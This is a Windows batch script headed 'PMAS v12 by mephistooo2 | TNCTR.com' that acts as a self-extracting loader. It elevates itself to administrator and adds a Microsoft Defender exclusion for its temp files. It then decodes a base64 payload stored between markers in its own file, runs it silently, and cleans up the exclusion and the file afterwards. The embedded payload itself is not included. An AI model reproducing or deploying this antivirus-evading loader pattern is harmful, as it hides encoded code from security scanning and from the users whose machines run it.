@echo off
attrib +R "%~f0" >nul 2>&1
title PMAS v12 by mephistooo2 ^| TNCTR.com
color 0a

:: Admin Control
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if %errorlevel% NEQ 0 (
    powershell -NoProfile -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)

pushd %temp%

set "tmpfile=pmas_%RANDOM%%RANDOM%.bat"

:: Defender exclusion is being added. (Win8.1+, otherwise it can be silently bypassed)
powershell -NoProfile -Command "try{$p=[IO.Path]::Combine($env:TEMP,'pmas_*.bat');if(Get-Command Add-MpPreference -ErrorAction SilentlyContinue){Add-MpPreference -ExclusionPath $p -Force}}catch{}" 2>nul

:: Extract the original file (Win7 PS2.0 compatible: ReadAllText + temp variable)
powershell -NoProfile -Command ^
 "try{$r=[IO.File]::ReadAllText('%~f0',[Text.Encoding]::UTF8);$ms='::pmas_'+'start';$me='::pmas_'+'end';$d=(($r -split $ms)[1] -split $me)[0]-replace'\s','';$b=[Convert]::FromBase64String($d);[IO.File]::WriteAllBytes('%tmpfile%',$b)}catch{}" 2>nul

echo.
if exist "%tmpfile%" (
	echo.
	echo		Initializing, please wait...
    cmd /c "%tmpfile%" 2>nul
) else (
    echo [PMAS] The file could not be created.
    pause >nul
)

:: Defender exclusion removal
powershell -NoProfile -Command "try{$p=[IO.Path]::Combine($env:TEMP,'pmas_*.bat');if(Get-Command Remove-MpPreference -ErrorAction SilentlyContinue){Remove-MpPreference -ExclusionPath $p -Force}}catch{}" 2>nul

if exist "%tmpfile%" (del /f /q "%tmpfile%" >nul 2>&1)
exit /b

